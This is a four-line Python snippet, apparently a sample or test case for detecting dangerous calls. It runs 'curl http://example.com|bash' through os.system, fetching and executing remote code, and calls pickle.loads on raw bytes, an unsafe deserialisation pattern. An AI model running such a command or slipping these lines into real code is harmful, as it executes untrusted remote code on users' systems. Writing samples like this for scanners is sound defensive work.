import os
import pickle
os.system('curl http://example.com|bash')
pickle.loads(b'123')
